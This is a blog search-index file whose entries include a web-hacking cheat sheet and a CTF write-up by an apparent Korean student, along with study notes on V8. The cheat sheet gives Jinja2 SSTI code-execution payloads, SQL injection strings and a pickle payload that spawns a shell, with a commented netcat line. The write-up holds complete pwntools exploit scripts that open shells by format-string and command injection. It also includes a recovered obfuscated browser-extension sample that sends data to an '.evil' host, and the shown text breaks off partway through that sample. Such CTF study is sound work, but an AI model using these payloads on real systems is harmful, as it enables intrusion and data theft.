var store = [{
        "title": "Start Again",
        "excerpt":"My fourth github blog start ğŸ‡   Using jekyll again âœ¨   And it can be set easily~ ğŸƒ   This formula $f(x) = x^2$ is an example.   $$ \\lim_{x\\to 0}{\\frac{e^x-1}{2x}} \\overset{\\left[\\frac{0}{0}\\right]}{\\underset{\\mathrm{H}}{=}} \\lim_{x\\to 0}{\\frac{e^x}{2}}={\\frac{1}{2}} $$  $$ \\begin{aligned}  a^2 + b^2 &= c^2 \\\\  E &= M \\cdot C^2 \\\\  &= xy + \\mathbb{E}  \\end{aligned} $$  minimal-mistakes theme is better to expose my thoughts ordered by my favorites  ","categories": ["life"],
        "tags": ["hello","world"],
        "url": "/life/start-again/",
        "teaser": null
      },{
        "title": "web note (update 2021.10.27)",
        "excerpt":"post will be frequently updated   SSTI (Server Side Template Injection)  í•´ë‹¹ ì·¨ì•½ì ì€ ì›¹ í”„ë ˆì„ì›Œí¬ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì—¬ëŸ¬ ê°€ì§€ Template Engineì—ì„œ ë°œìƒí•˜ë©°, íŠ¹ë³„í•œ êµ¬ë¬¸ì„ í†µí•´ RCEë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ë„ ìˆë‹¤.  This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.   â–¶ jinja2  # ê¸°ë³¸ {{ 4*4 }} =&gt; 16  # check with config {{ config }} {{ config.items() }} {{ config['secret_key'] }}  # RCE with config {{ config.__class__.__init__.__globals__['os'].popen(\"ls\").read() }} {{ (config|attr(\"__class__\")).__init__.__globals__['os'].popen('cat flag').read() }}  # etc ('',(),get_flashed_messages, url_for, ...) {{ ''.__class__.__mro__[1].__subclasses__()[**index**]('cat flag', shell=True, stdout=-1).communicate() }} {{ get_flashed_messages.__globals__.__builtins__.open(\"/flag\").read() }} {{ url_for.__globals__.__builtins__.eval('__import__(\"os\").popen(\"ls -al\").read()') }}   # with request - í•„í„°ë§ì´ ë§¤ìš° ë§ì„ ê²½ìš° more query + requestë¥¼ í™œìš©í•˜ì—¬ ìš°íšŒ http://foo.bar/?payload={{ request|attr('class')|attr(request.args.get('mro'))|attr(request.args.get('getitem'))(1) }}&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__ {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}       SQLI (sql injection)  í•´ë‹¹ ì·¨ì•½ì ì€ DBë¥¼ ê´€ë¦¬í•˜ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ SQL ì¿¼ë¦¬ë¥¼ ì „ë‹¬í•  ë•Œ ì˜ë„í•˜ì§€ ì•Šì€ êµ¬ë¬¸ì„ ì „ë‹¬í•  ìˆ˜ ìˆë„ë¡ ë³€ì¡°ì‹œí‚¤ëŠ” ë° ëª©ì ì´ ìˆë‹¤.  The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.   1. Comment symbol     /* ~ */, -- ~, # (URL encoded : %23)   -- example. Select * from tbl where id='(user_input)'  -- Select ALL query from tbl user_input=\"' or 1=1-- \" =&gt; Select * from tbl where id='' or 1=1--' user_input=\"' or 1=1#\" =&gt; Select * from tbl where id='' or 1=1# user_input=\"' or 1=1/*1234*/\" =&gt; Select * from tbl where id='' or 1=1/*1234*/' ...? (must have closed symbol)   2. with single quarter     idê°€ ''ë¡œ ê°ì‹¸ì ¸ ìˆì„ ê²½ìš° 'ë¥¼ inputìœ¼ë¡œ ë„£ì–´ ë¨¼ì € ë‹«ì•„ì£¼ê²Œë” í•œ ë’¤ ì¡°ê±´ë¬¸ì„ ì´ì–´ì¤€ë‹¤.   -- example. Select * from tbl where id='(user_input)'  -- Select ALL query from tbl user_input=\"' or 1='1\" =&gt; Select * from tbl where id='' or 1='1'   3. and, or, &amp;&amp;, ||, in, between, like  -- and, or Select * from tbl where id='1234' and pw='5678' Select * from tbl where id='1234' or pw='5678'  -- &amp;&amp;, || (no space required) Select * from tbl where id='1234'&amp;&amp;pw='5678' Select * from tbl where id='1234'||pw='5678'  -- in Select * from tbl where id in '1234' and pw in '5678'  -- between and (both number and char are possible) Select * from tbl where age between 20 and 30 -- 20&lt;=age&lt;=30 Select * from tbl where score between 'A' and 'C' -- 'A'&lt;=score&lt;='C'  --like (starts with ~, ends with ~, include ~, length) Select * from tbl where name like 'Bae%' -- starts with Bae Select * from tbl where name like '%uk' -- ends with uk Select * from tbl where name like '%won%' -- include won Select * from tbl where name like '___' -- length 3 chars Select * from tbl where binary name like '~' -- distinguish upper/lower   4. Internal function in mysql     char(...) : change integer arguments to char (ex. char(0x61,0x62,0x63)=&gt;\"abc\")   mid/substr[ing](a,b,c) : get c bytes in a from b(starts from 1 ~ ..)   left(a,b) / right(a,b) : get b bytes in a (begin / end(reverse but print correctly))   version() : get mysql version   database() : get current database       python pickle deserialization  pickleë¡œ ì§ë ¬í™”ëœ ê°ì²´ê°€ ë³€ì¡°ë˜ì–´ ì—­ì§ë ¬í™”í•˜ëŠ” ê³¼ì •ì—ì„œ ì‹œìŠ¤í…œì— ì ‘ê·¼í•˜ê±°ë‚˜ ì˜ë„ì¹˜ ì•Šì€ ê²ƒì´ ì‹¤í–‰ë˜ê¸°ë„ í•œë‹¤. ì›í•˜ëŠ” classë¥¼ ì„ ì–¸í•œ ë’¤, __reduce__ë¥¼ í†µí•˜ì—¬ pickle.loads í•¨ìˆ˜ì—ì„œ unpickle ì‹œ tupleì„ ë°˜í™˜í•˜ì—¬ í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆë‹¤.   import os import pickle  class payload(object):   def __reduce__(self):     #return (os.system, ('ls', ))     #return (os.system, ('cat flag', ))     return (os.system, ('/bin/sh', ))     #return (os.system, ('/bin/sh | nc [ip] [port]', ))  pickle_d=pickle.dumps(payload()) pickle.loads(pickle_d) # get shell anyway  $ id uid=1000(test) gid=1000(test) groups=1000(test)   update ì˜ˆì •.  ","categories": ["note"],
        "tags": [],
        "url": "/note/web-note-update/",
        "teaser": null
      },{
        "title": "Personal R&D plan beginning from 'now'",
        "excerpt":"UPDATED : 19 JUL 2024 13:00 UTC+9 KST That would be LAST UPDATE, Letâ€™s plan more!   This is my plan to be finished until/after graduating.   Research     Â§ must be finished until new yearâ€™s day Â§         Kernel : Dirty Cow Analysis (CVE-2016-5195) -Complete     Browser V8 : Study/Build V8 frequently and get shell from V8 Engine -Complete      Develop     Â§ new year STUDY plan Â§         Making interpreter/compiler with Rust (With Chris Ohk, ..) s       Goal                 Try something â€œnewâ€, Try Everything         Pass any awesome Univ.â€™s admission (Complete)         Pass drive license (Complete)         Dreamhack Wargame 1st                        Format Sniper (Learn &amp; Analyze about FSB, Solved :D)             Dreamcurl (Rev O, Crypto X. So learn mathematics!, Solved :D)             Unibitmap (Solved :D)             dreamboard v2 (V8 : Solved :D)                             Purchase another laptop (DELL XPS 15 12th generation Intel CPU)         BoB (Best of the Best) 14th? 15th?         Try to be the BEST without competitive mind, Just enjoy                 ","categories": ["life"],
        "tags": [],
        "url": "/life/list-after-graduate/",
        "teaser": null
      },{
        "title": "[V8 Study] 00-introduction",
        "excerpt":"[!] ìš°ì„ ì ìœ¼ë¡œ í•œê¸€ë¡œ ì‘ì„±í•˜ì—¬ ì¶”í›„ ë²ˆì—­í•  ì˜ˆì •.   Summary  ìš°ë¦¬ê°€ ëŒ€ì¤‘ì ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” Google Chrome browserì—ëŠ” ì›¹í˜ì´ì§€ë¥¼ ë™ì ìœ¼ë¡œ ì‹¤í–‰ì‹œí‚¤ê¸° ìœ„í•´ javascriptê°€ êµ¬ë™ë  ìˆ˜ ìˆë„ë¡ ì§€ì›í•˜ê³  ìˆë‹¤. ê·¸ë ‡ë‹¤ë©´, JSë¥¼ ì›í™œí•˜ê²Œ ì‹¤í–‰í•˜ê³  ì»´íŒŒì¼í•˜ëŠ” ì—­í• ì€ ì–´ë–¤ ê²ƒì´ ë§¡ê³  ìˆì„ê¹Œ? ì´ ì±•í„°ì—ì„œëŠ” ë‚´ê°€ ê³µë¶€í–ˆë˜ chromium javascript engineì¸ V8ì— ëŒ€í•´ì„œ ì•Œì•„ë³´ê³ ì í•œë‹¤.   V8ì˜ êµ¬ì¡°ëŠ” ì–´ë–»ê²Œ ë˜ì–´ ìˆì„ê¹Œ?   V8ê°™ì€ ê²½ìš° Chrome êµ¬ë™ ì‹œ í•˜ë‚˜ì˜ í”„ë¡œì„¸ìŠ¤ë¡œ ì‹¤í–‰ë˜ì–´ heap ë° stack ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê´€ë¦¬í•˜ë©´ì„œ Javascriptì˜ ê°ì¢… ë³€ìˆ˜ì™€ ë©”ì†Œë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê°€ì¥ í•µì‹¬ì ì¸ execution fileë¡œ ë™ì‘í•œë‹¤. ì´ì™¸ì— Task/Callback queue, Microtask queue, WebAPI ë“± ë‹¤ì–‘í•œ ìš”ì†Œê°€ Chromium browserë¥¼ êµ¬ì„±í•˜ê³  ë™ì‘í•˜ëŠ”ë° ì‚¬ìš©ëœë‹¤.   ê°€ì¥ ëŒ€í‘œì ì¸ ì—­í• ì€ javascript ì½”ë“œë¥¼ ì»´íŒŒì¼ëœ ì»´í“¨í„°ì— ìµœì í™”ëœ ì½”ë“œë¡œ ë³€í™˜ì‹œì¼œ ì „ë‹¬í•˜ê²Œ ëœë‹¤ëŠ” ê²ƒì´ë‹¤. ì´ë•Œ JIT(Just-In-Time) Compilerë¼ëŠ” ë…ì°½ì ì¸ ì»´íŒŒì¼ëŸ¬ë¥¼ ì‚¬ìš©í•œë‹¤.   V8ë§Œì˜ íŠ¹ì§•ì€ ë¬´ì—‡ì´ ìˆì„ê¹Œ?     ìš°ì„  ì¸í„°í”„ë¦¬í„°ì™€ ì»´íŒŒì¼ëŸ¬ì— ëŒ€í•´ ì•Œì•„ì•¼ í•  ê²ƒì´ë‹¤.     ì¸í„°í”„ë¦¬í„°            ì¥ì  : í•œ ì¤„ í•œ ì¤„ ë³€í™˜í•˜ê¸° ë•Œë¬¸ì— ì‹¤í–‰ ì†ë„ê°€ ë¹ ë¥´ë‹¤.       ë‹¨ì  : ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œê°€ ë³µì¡í•´ì§ˆìˆ˜ë¡ ì ì  ì†ë„ê°€ ëŠë ¤ì§„ë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ê°™ì€ ì½”ë“œë¥¼ ì—¬ëŸ¬ì°¨ë¡€ ë°˜ë³µí•˜ëŠ” ë°˜ë³µë¬¸ì˜ ê²½ìš°, ê°™ì€ ê²°ê³¼ë¥¼ ë°˜ë³µí•˜ëŠ” ê²ƒì„ì—ë„ ë¶ˆêµ¬í•˜ê³  ì½”ë“œë¥¼ í•œ ì¤„ í•œ ì¤„ ì½ëŠ” ë°©ì‹ì— ì˜í•´ ê·¸ë•Œê·¸ë•Œ ì‹¤í–‰ëœë‹¤.           ì»´íŒŒì¼ëŸ¬            ì¥ì  : íŒŒì¼ ì „ì²´ë¥¼ í•œë²ˆì— ì½ì–´ì„œ ì»´íŒŒì¼ëŸ¬ëŠ” ì‘ì—…ì„ ë‹¨ìˆœí™”ì‹œí‚¨ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ íŠ¹ì • í•¨ìˆ˜ë¥¼ 10ì–µë²ˆ ë°˜ë³µí•´ì•¼ í•  ê²½ìš°, ì»´íŒŒì¼ ê³¼ì •ì—ì„œ í•¨ìˆ˜ë¥¼ ë°˜ë³µí•˜ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ í•¨ìˆ˜ì˜ ê²°ê³¼ë¬¼ì„ ë°˜ë³µí•˜ë„ë¡ ì»´íŒŒì¼ í•œë‹¤. ì´ì²˜ëŸ¼ ë¶ˆí•„ìš”í•œ ë™ì‘ì„ ì œê±°í•˜ëŠ” ì»´íŒŒì¼ëŸ¬ì˜ ë°©ì‹ì„ ìµœì í™”, optimizationì´ë¼ê³  í•œë‹¤.  (ì¸í„°í”„ë¦¬í„°ëŠ” optimizeí•˜ì§€ ì•ŠëŠ”ë‹¤ )       ë‹¨ì  : ì½”ë“œë¥¼ ë°”ë¡œ ì‹¤í–‰í•˜ì§€ ì•Šê³ , ì½”ë“œ ì‹¤í–‰ ì „ ì „ì²´ë¥¼ ì»´íŒŒì¼ í•˜ëŠ” ê³¼ì •ì´ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— ì´ˆê¸°ì— ì†ë„ê°€ ëŠë¦´ ìˆ˜ ë°–ì— ì—†ë‹¤.           ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ì˜ ë‚´ë¶€ë¥¼ ê³µë¶€í•˜ë‹¤ê°€ ì ì‹œ ì¸í„°í”„ë¦¬í„°ì™€ ì»´íŒŒì¼ëŸ¬ì˜ ê°„ë‹¨í•œ ê°œë…ê³¼ ì¥ë‹¨ì ì„ ì§šì–´ë´¤ë‹¤. ê·¸ëŸ¬ë©´ ê³¼ì—° V8 ì—”ì§„ì€ ì–´ë–¤ ë°©ì‹ì„ ì·¨í–ˆê¸¸ë˜ ë‹¤ë¥¸ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ë³´ë‹¤ ë” ë¹ ë¥´ê³  íš¨ìœ¨ì ìœ¼ë¡œ ìë°”ìŠ¤í¬ë¦½íŠ¸ ëª…ë ¹ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆì„ê¹Œ? ë°”ë¡œ ì—¬ê¸°ì—ì„œ V8 ì—”ì§„ì˜ ë…íŠ¹í•œ ì–¸ì–´ ë³€í™˜ ë„êµ¬ì¸ JIT Compilerê°€ ë“¤ì–´ì˜¨ë‹¤. JITì€ Just In Timeì˜ ì•½ìì´ë‹¤.   JIT Compilerì˜ êµ¬ì¡°     V8 ì—”ì§„ì€ ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì¡°ë¡œ ë˜ì–´ ìˆë‹¤.     Parser : ì½”ë“œë¥¼ Lexical Analysisë¼ëŠ” ê³¼ì •ì„ í†µí•´ í† í°ìœ¼ë¡œ ë¶„í•´í•œë‹¤.   AST(Abstract Syntax Tree) : Parserì—ì„œ ë¶„í•´ëœ í† í°ì„ ë°”íƒ•ìœ¼ë¡œ ì¶”ìƒì ì¸ íŠ¸ë¦¬ë¥¼ ìƒì„±í•œë‹¤.   Ignition : ASTì—ì„œ ë‚˜ì˜¨ íŠ¸ë¦¬ë¥¼ V8ì˜ ì¸í„°í”„ë¦¬í„°ì¸ ignitionì—ê²Œ ì „ë‹¬í•˜ê³  ì´ê²ƒì„ ì¸í„°í”„ë¦¬í„°ëŠ” bytecodeë¡œ ë³€í™˜ì‹œí‚¨ë‹¤. (High-level Lang to Low-level Lang)   TurboFan, Profiler : bytecodeë¥¼ ì‹¤í–‰í•˜ì—¬ Human-readable Langì„ ì‹¤í–‰ì‹œí‚¤ê³ , ê·¸ì¤‘ ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¼ê³  íŒë³„ëœ ì½”ë“œ ì¡°ê°ì€ TurboFanìœ¼ë¡œ ë³´ë‚´ì ¸ ìµœì í™”ë¥¼ ìˆ˜í–‰í•˜ì—¬ ìƒˆë¡œìš´ ì»´íŒŒì¼ëœ ì½”ë“œë¡œ ì¬êµ¬ì„±ëœë‹¤. (ì´ë•Œ ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¼ëŠ” ë§ì´ ë§¤ìš° ì¶”ìƒì ì´ë¯€ë¡œ Profiler ë¼ëŠ” ì¹œêµ¬í•œí…Œ ì‚¬ìš© ë¹ˆë„ ìˆ˜ ë“±ì„ ìˆ˜ì§‘í•˜ê²Œë” ì—­í• ì„ ë¶€ì—¬í•˜ê³ , ëª¨ì¸ ë°ì´í„°ë¥¼ í†µí•´ Turbofanì˜ ì•Œê³ ë¦¬ì¦˜ëŒ€ë¡œ ìµœì í™”ë¥¼ í•œë‹¤)   Turbofanì€ ì–´ë–¤ ì¡°ê±´ìœ¼ë¡œ ìµœì í™”í•˜ëŠ” ê±¸ê¹Œ?          ì½”ë“œê°€ ëœ¨ê²ê³  ì•ˆì •ì ì¸ ê²ƒ, ì‰½ê²Œ ë§í•˜ë©´ ìì£¼ í˜¸ì¶œë˜ê³ (ëœ¨ê²ê³ ) ì½”ë“œê°€ ì•ˆ ë³€í•¨(ì•ˆì •ì )ì´ë¼ëŠ” ê²ƒì´ë‹¤. ë§¤ë²ˆ ê°™ì€ í–‰ë™ì„ ìˆ˜í–‰í•˜ëŠ” ë°˜ë³µë¬¸ ë‚´ì— ìˆëŠ” ì½”ë“œ ê°™ì€ ê²½ìš°ê°€ ì—¬ê¸°ì— í•´ë‹¹í•˜ê¸° ì‰½ë‹¤.            ì¸í„°í”„ë¦¬íŒ…ëœ ë°”ì´íŠ¸ ì½”ë“œì˜ ê¸¸ì´ë¥¼ ë³´ê³  íŠ¹ì • ì„ê³„ì ì„ ë„˜ê¸°ì§€ ì•Šìœ¼ë©´ ì‘ì€ í•¨ìˆ˜ë¼ê³  íŒë‹¨í•´ì„œ ìµœì í™”ë¥¼ ì§„í–‰í•˜ëŠ” ê²ƒì´ë‹¤. ì‘ê³  ë‹¨ìˆœí•œ í•¨ìˆ˜ëŠ” í¬ê³  ë³µì¡í•œ í•¨ìˆ˜ë³´ë‹¤ ë™ì‘ì´ ë§¤ìš° ì¶”ìƒì ì´ê±°ë‚˜ ì œí•œì ì¸ í™•ë¥ ì´ ë†’ê¸° ë•Œë¬¸ì— ì•ˆì •ì ì´ë¼ê³  ë³¼ ìˆ˜ ìˆë‹¤.       [!] ê·¸ëŸ¬ë‚˜, ì»´íŒŒì¼ëŸ¬ëŠ” 100% ì™„ë²½í•˜ì§€ ëª»í•˜ê¸° ë•Œë¬¸ì— ì˜ë„ì™€ ë‹¤ë¥´ê²Œ ë°œì í™”(deoptimization)ê°€ ì¼ì–´ë‚  ìˆ˜ë„ ìˆë‹¤.   Next Topic  ë‹¤ìŒì—ëŠ” V8ì—ì„œ ìë£Œí˜•ì´ë‚˜ JSì˜ ë‹¤ì–‘í•œ ë©”ì†Œë“œê°€ ì–´ë–¤ ì‹ìœ¼ë¡œ ì €ì¥ì´ ë˜ê³  ë¶ˆëŸ¬ì˜¬ ìˆ˜ ìˆëŠ”ì§€ë¥¼ ì•Œì•„ë³´ê³ ì í•œë‹¤.   reference     https://dkwjdi.tistory.com/194   https://github.com/danbev/learning-v8/blob/master/notes/intro.md  ","categories": ["note"],
        "tags": [],
        "url": "/note/V8-introduction/",
        "teaser": null
      },{
        "title": "CTF Write-up [test]",
        "excerpt":"Summary  Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic.  pwn focused on FSB attack or ezpz kernel exploitation.  RSA, elgamel simple attack in crypto. and etc..   Tasks      PwnableğŸ’»            Payback       Insider       OpenDoor           CryptographyğŸ’¡            BBGun06 (+ revenge)       ElElGamal           Reversingâš™ï¸            BreakOut       ChromeMiner, Assisted           ForensicğŸ”            Linaâ€™s Invitation           PWN : Payback   1. Analyze  mitigations are here:  [*] '/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback'     Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled     RUNPATH:  b'./.glibc/'  I found that delete_bot function has Format string bug when I send delete_reason.  int delete_bot() {     unsigned int id;     id = getId(); // 0 ~ 31     if (botBuf[id].url != NULL)     {         char reasonbuf[MAX_REASON_SIZE];         memset(reasonbuf, '\\x00', MAX_REASON_SIZE);         // gather statistics         printf(\"\\n[*] Enter the reason of deletion: \");         read(STDIN_FILENO, &amp;reasonbuf, MAX_REASON_SIZE - 1);         free(botBuf[id].url);         botBuf[id].url = NULL;         puts(\"\\n[+] Bot Deleted successfully! | Reason: \");         printf(reasonbuf);         return 0;     }     puts(\"\\n[!] Error: Unable to fetch the requested bot entry.\\n\"); }  reasonbuf is in a stack area so I can check FSB attack offset with input buffer.  If I manage __free_hook, I can call system(\"/bin/sh\\x00\") when I call delete_bot.  Setting botâ€™s URL to /bin/sh\\x00 and calling free can trigger shell.  Letâ€™s exploit!   2. Exploit Code  from pwn import *  # p=process(\"./payback\") p=remote(\"142.93.37.110\",30669) e=ELF(\"./payback\") l=ELF(\".glibc/libc.so.6\")  def add():     p.sendlineafter(\"&gt;&gt; \", str(1).encode())     p.sendlineafter(\": \", \"/bin/sh\\x00\")     p.sendlineafter(\": \", \"0\")  def delete(id, fsb_pay):     p.sendlineafter(\"&gt;&gt; \", str(3))     p.sendlineafter(\": \", str(id))     pause()     p.sendafter(\": \", fsb_pay)  add() delete(0, \"%p\") # overwrite offset : 8  p.recvuntil(\"Reason: \\n\") libc_base = int(p.recv(14),16) - 0x1ed723 free_hook = libc_base + l.sym['__free_hook'] system = libc_base + l.sym['system']  log.info(hex(libc_base)) log.info(hex(free_hook))  add()  low = system &amp; 0xffff mid = (system &gt;&gt; 16) &amp; 0xffff high = system &gt;&gt; 32  if mid &gt; low:     rmid = mid-low else:     rmid = 0x10000+mid-low  if high &gt; mid:     rhigh = high-mid else:     rhigh = 0x10000+high-mid  log.info(hex(low)) log.info(hex(mid)) log.info(hex(high))  payload = '' payload += '%{}c'.format(low) payload += '%13$hn' payload += '%{}c'.format(rmid) payload += '%14$hn' payload += '%{}c'.format(rhigh) payload += '%15$hn' payload += 'A' payload = payload.encode() #print(len(payload)) payload += p64(free_hook) payload += p64(free_hook + 2) payload += p64(free_hook + 4)  delete(0, payload)  add() delete(0, b\"pwned\")  p.interactive()     Flag is HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}.     PWN : Insider   1. Analyze  Binary run FTP cli program with 30 commands.     USER ;) : compare with ;) string, if itâ€™s correct, prepare PASS command.   PASS ;) : same with USER command, if password correct, I can use all of cmds.   BKDR [payload] : short expression of backdoor I think, it can be attacked by FSB with limited condition.   LIST : get current working directory (CWD) by using getcwd() function.  also run ls -al [result of getcwd()] with popen.  if process run successfully, result should be written in console.   CWD [path] : change working directory with my own path.   MKDR [path] : make directory with my own path.   .. etc   BKDR command can leak stack area or overwrite stack area.  I found unchanged stack position that makes denied access to LIST command.  (value : -1, LIST NOT ALLOWED!)   at first, I used RETR command to read /flag.txt, but this fileâ€™s permission is only read in root, r--------. Need to find another way..      v131 should be more than 0, so if I found right offset of v131, can be overwritten by %[offset]$n.   2. After Getting shell..?     MKDR ;sh : make directory named ;sh. itâ€™s legal expression in linux.   CWD ;sh : change working directory to /home/ctf/;sh   LIST : call getcwd() =&gt; /home/ctf/;sh and combine string (result : ls -al /home/ctf/;sh) !!!SHELL EXECUTED!!!   In the shell, cd /home/ctf =&gt; I noticed that get_flag fileâ€™s RUNPATH is ./, so changing working directory to /home/ctf is necessary.   In the shell, ./get_flag =&gt; Execute!   In the shell, exit =&gt; for receiving results of entire commands.  (because commands is running in popen process)   3. Exploit Code  from pwn import *  #context.log_level = 'debug'  p = remote(\"104.248.175.153\",30467) #p = process('./chall')  def qwer(x, noRecv=False):         if not noRecv:  p.recv()         p.send(x)         sleep(0.5)  qwer(\"USER ;)\") qwer(\"PASS ;)\")  qwer(\"BKDR %p %p %p %p %p %p %p\") p.recvuntil(\"(nil) 0x\") leak = int(p.recv(12), 16) + 0x66c0 log.info(hex(leak))  pay = b'BKDR' pay += b' %1035$n'  #pause() pay = pay.ljust(0x28-3, b'b') pay += p64(leak) pay += b\"ASDF\" qwer(pay)  #qwer(\"STOR .profile\") #qwer(\"alias ls='sh;ls'\".ljust(0x1000, 'a') + 'LIST', True) #p.shutdown('send')  qwer(\"MKDR ;sh\") qwer(\"CWD ;sh\") qwer(\"LIST\")  p.sendline(\"cd /home/ctf\") p.sendline(\"./get_flag\") p.sendline(\"exit\") p.interactive()   Flag is HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}.     PWN : OpenDoor  ! REDACTED !  Exploit Code : https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb     CRYPTO : BBGun06  1. Analyze   BBGun06 / revenge has same verify(self,message, signature) code:  def verify(self, message, signature):         keylength = len(long_to_bytes(self.n))         decrypted = self.encrypt(signature)         clearsig = decrypted.to_bytes(keylength, \"big\")          r = re.compile(b'\\x00\\x01\\xff+?\\x00(.{15})(.{20})', re.DOTALL)         m = r.match(clearsig)          if not m:             raise VerificationError('Verification failed')          if m.group(1) != self.asn1:             raise VerificationError('Verification failed')          if m.group(2) != sha1(message).digest():             raise VerificationError('Verification failed')          return True   And en/decrypt function changes signature code(byte) to long by using bytes_to_long to calculate with integer.  Decrypted message is same when I give bytes string that has same integer result. That means, dec(\"0001\") == dec(\"01\"). Itâ€™s simple!  send given signature with 00 :D, 00 + sig  revenge prob has the same solving process lol:) See below.  2. Exploit (Manual)  // for_BBGun06 signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10  ... // for_BBGun06 revenge Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 HTB{8131ch3n84ch32'06_519n47u23_f02932y}  signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f  ...  Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f HTB{1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32's}     CRYPTO : ElElGamal  I didnâ€™t know about ElGamal in cryptography, so I searched a lot.  writingâ€¦ â€”   REV : BreakOut   1. FLAG Recovering     Connect URL:port/proc/self/maps and see what prob should be the base program. /bkd is running!   Download bkd file in website.   Realize itâ€™s web server made by C++.   Find secretGet function and get flag.   2. Get FLAG     Flag is HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}.     REV : ChromeMiner   Fully obfuscated js Challenge.   1. Recover with hand  async function iF() {   if (!('injected' in document)) {     document['injected'] = true;     window['setInterval'](async () =&gt; {       y = new window['Uint8Array'](64);       window['crypto']['getRandomValues'](y);       if (new window['TextDecoder']('utf-8')['decode'](await window['crypto']['subtle']['digest']('sha-256', y))['endsWith']('chrome')) {         j = new window['Uint8Array'](y['byteLength'] + (await window['crypto']['subtle']['digest']('sha-256', y))['byteLength']);         j['set'](new window['Uint8Array'](y), 0);         j['set'](new window['Uint8Array'](await window['crypto']['subtle']['digest']('sha-256', y)), y['byteLength']);         window['fetch']('hxxps://qwertzuiop123.evil/' +          [...new window['Uint8Array'](await window['crypto']['subtle']['encrypt']({['name']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', await window['crypto']['subtle']['decrypt']({['name']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_'), {['name']: 'AES-CBC'}, true, ['decrypt']), new window['Uint8Array'](('E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8')['match'](/../g)['map'](h =&gt; window['parseInt'](h, 